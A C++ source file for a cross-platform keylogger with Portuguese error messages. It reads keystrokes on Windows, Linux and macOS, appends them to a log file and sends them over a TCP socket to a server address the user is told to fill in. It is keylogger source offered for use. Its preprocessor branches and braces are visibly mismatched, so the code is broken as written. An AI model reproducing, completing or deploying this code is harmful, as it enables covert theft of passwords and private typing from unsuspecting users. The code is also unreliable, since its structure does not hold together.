#include <iostream>
#include <fstream>
#include <string>

#ifdef _WIN32
    // Windows headers
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#elif __linux__
    // Linux headers
    #include <unistd.h>
    #include <fcntl.h>
    #include <linux/input.h>
    #include <sys/ioctl.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <linux/input-event-codes.h>
#elif __APPLE__
    // Mac headers
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/ioctl.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <IOKit/hid/IOHIDLib.h>
#endif

using namespace std;

// IP address and port of socket server
const string SERVER_IP = "127.0.0.1";  // Put your server IP here
const int SERVER_PORT = 12345;         // Put your server port here

int main() {
    string keys;
    int keyboard_fd = -1;
    int socket_fd = -1;

#ifdef _WIN32
    // Windows implementation
    HANDLE keyboardHandle = GetStdHandle(STD_INPUT_HANDLE);
    DWORD consoleMode;
    GetConsoleMode(keyboardHandle, &consoleMode);
    SetConsoleMode(keyboardHandle, ENABLE_EXTENDED_FLAGS | ENABLE_WINDOW_INPUT | ENABLE_MOUSE_INPUT);

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "Erro ao inicializar o Winsock." << endl;
        return 1;
    }

    // Create socket
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        cout << "Erro ao criar o socket." << endl;
        WSACleanup();
        return 1;
    }
#elif __linux__
    // Linux implementation
    for (int i = 0; i <= 32; i++) {
        string dev_path = "/dev/input/event" + to_string(i);
        keyboard_fd = open(dev_path.c_str(), O_RDONLY | O_NONBLOCK);
        if (keyboard_fd != -1) {
            char name[256] = "Unknown";
            if (ioctl(keyboard_fd, EVIOCGNAME(sizeof(name)), name) < 0) {
                cout << "Erro ao obter o nome do dispositivo de teclado." << endl;
                close(keyboard_fd);
                return 1;
            }
            if (string(name).find("keyboard") != string::npos) {
                // keyboard device found
                break;
            }
            close(keyboard_fd);
        }
    }

    if (keyboard_fd == -1) {
        cout << "Nenhum dispositivo de teclado encontrado." << endl;
        return 1;
    }

    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == -1) {
        cout << "Erro ao criar o socket." << endl;
        close(keyboard_fd);
        return 1;
    }

    struct sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
        cout << "Endereço IP inválido." << endl;
        close(keyboard_fd);
        close(socket_fd);

#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        cout << "Erro ao conectar ao servidor." << endl;
        close(keyboard_fd);
        close(socket_fd);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    while (true) {
        char buffer[256];
        memset(buffer, 0, sizeof(buffer));

#ifdef _WIN32
        INPUT_RECORD inputRecord;
        DWORD eventsRead;
        ReadConsoleInput(keyboardHandle, &inputRecord, 1, &eventsRead);

        if (inputRecord.EventType == KEY_EVENT && inputRecord.Event.KeyEvent.bKeyDown) {
            WORD keyCode = inputRecord.Event.KeyEvent.wVirtualKeyCode;
            if (keyCode == VK_RETURN) {
                cout << "<br>";
                keys += "<br>";
            } else if (keyCode == VK_SPACE) {
                cout << " ";
                keys += " ";
            } else if (keyCode == VK_OEM_PERIOD) {
                cout << ".";
                keys += ".";
            } else if (keyCode >= 'A' && keyCode <= 'Z') {
                cout << static_cast<char>(keyCode);
                keys += static_cast<char>(keyCode);
            }
#elif __linux__
        struct input_event ev;
        read(keyboard_fd, &ev, sizeof(struct input_event));

        if (ev.type == EV_KEY && ev.value == 1) {
            switch (ev.code) {
                case KEY_A:
                    cout << "a";
                    keys += "a";
                    break;
                case KEY_B:
                    cout << "b";
                    keys += "b";
                    break;
                case KEY_ENTER:
                    cout << "<br>";
                    keys += "<br>";
                    break;
                case KEY_SPACE:
                    cout << " ";
                    keys += " ";
                    break;
                case KEY_DOT:
                    cout << ".";
                    keys += ".";
                    break;
                default:
                    break;
            }
#elif __APPLE__
        char data[8];
        ssize_t bytesRead = read(keyboard_fd, data, sizeof(data));

        if (bytesRead > 0) {
            uint8_t keyCode = data[2];

            if (keyCode == 0x24) {
                cout << "<br>";
                keys += "<br>";
            } else if (keyCode == 0x31) {
                cout << " ";
                keys += " ";
            } else if (keyCode == 0x2E) {
                cout << ".";
                keys += ".";
            } else if (keyCode >= 0x04 && keyCode <= 0x1F) {
                cout << static_cast<char>('a' + (keyCode - 0x04));
                keys += static_cast<char>('a' + (keyCode - 0x04));
            }
        }

        ofstream myfile;
        myfile.open("/Users/user/log.txt", ios::app); // Replace with your desired path and file name
        myfile << keys;
        myfile.close();

        // Send data to socket server
        if (send(socket_fd, keys.c_str(), keys.length(), 0) == -1) {
            cout << "Erro ao enviar os dados para o servidor." << endl;
            close(keyboard_fd);
            close(socket_fd);

#ifdef _WIN32
            WSACleanup();
#endif
            return 1;
        }
    }
}

close(keyboard_fd);
close(socket_fd);

#ifdef _WIN32
WSACleanup();
#endif
return 0;
}
